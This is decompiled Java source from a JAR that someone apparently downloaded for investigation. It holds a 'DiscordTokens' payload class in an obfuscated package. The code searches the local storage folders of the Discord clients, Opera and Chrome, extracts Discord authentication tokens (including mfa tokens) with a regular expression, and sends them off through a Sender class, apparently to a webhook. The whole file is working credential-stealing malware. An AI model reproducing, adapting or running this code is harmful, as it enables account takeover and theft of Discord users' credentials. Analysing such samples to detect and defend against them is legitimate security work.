/*    */ package idasido.adldaosd.wpiw.payload.impl;
/*    */ import idasido.adldaosd.wpiw.payload.Payload;
/*    */ import idasido.adldaosd.wpiw.payload.Sender;
/*    */ import java.io.BufferedReader;
/*    */ import java.io.DataInputStream;
/*    */ import java.io.File;
/*    */ import java.io.FileInputStream;
/*    */ import java.io.InputStreamReader;
/*    */ import java.util.ArrayList;
/*    */ import java.util.List;
/*    */ import java.util.regex.Matcher;
/*    */ import java.util.regex.Pattern;
/*    */ 
/*    */ public final class DiscordTokens implements Payload {
/*    */   public void execute() {
/* 16 */     List<String> paths = new ArrayList<>();
/* 17 */     paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
/* 18 */     paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
/* 19 */     paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
/* 20 */     paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb");
/* 21 */     paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb");
/*    */ 
/*    */ 
/*    */     
/* 25 */     int cx = 0;
/* 26 */     StringBuilder webhooks = new StringBuilder();
/* 27 */     webhooks.append("TOKEN[S]\n");
/*    */     
/*    */     try {
/* 30 */       for (String path : paths) {
/* 31 */         File f = new File(path);
/* 32 */         String[] pathnames = f.list();
/* 33 */         if (pathnames == null)
/*    */           continue; 
/* 35 */         for (String pathname : pathnames) {
/*    */           try {
/* 37 */             FileInputStream fstream = new FileInputStream(path + pathname);
/* 38 */             DataInputStream in = new DataInputStream(fstream);
/* 39 */             BufferedReader br = new BufferedReader(new InputStreamReader(in));
/*    */             
/*    */             String strLine;
/* 42 */             while ((strLine = br.readLine()) != null)
/*    */             {
/* 44 */               Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
/* 45 */               Matcher m = p.matcher(strLine);
/*    */               
/* 47 */               while (m.find()) {
/* 48 */                 if (cx > 0) {
/* 49 */                   webhooks.append("\n");
/*    */                 }
/* 51 */                 webhooks.append(" ").append(m.group());
/* 52 */                 cx++;
/*    */               }
/*    */             
/*    */             }
/*    */           
/* 57 */           } catch (Exception exception) {}
/*    */         } 
/*    */         
/* 60 */         Sender.send("```" + webhooks.toString() + "```");
/*    */       } 
/* 62 */     } catch (Exception exception) {}
/*    */   }
/*    */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-server.jar!\idasido\adldaosd\wpiw\payload\impl\DiscordTokens.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */